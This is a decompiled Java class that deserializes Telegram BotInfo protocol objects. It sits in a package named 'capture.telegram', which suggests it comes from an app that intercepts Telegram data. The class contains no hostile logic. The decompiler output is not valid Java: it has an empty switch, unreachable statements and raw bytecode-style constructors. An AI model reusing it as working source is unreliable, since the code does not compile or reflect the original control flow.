package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$BotInfo
  extends TLObject
{
  public ArrayList commands;
  public String description;
  public String share_text;
  public int user_id;
  public int version;
  
  public TLRPC$BotInfo()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.commands = localArrayList;
  }
  
  public static BotInfo TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in BotInfo", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_botInfoEmpty;
      ((TLRPC.TL_botInfoEmpty)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_botInfo;
      ((TLRPC.TL_botInfo)localObject).<init>();
    }
    if (localObject != null) {
      ((BotInfo)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (BotInfo)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$BotInfo.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */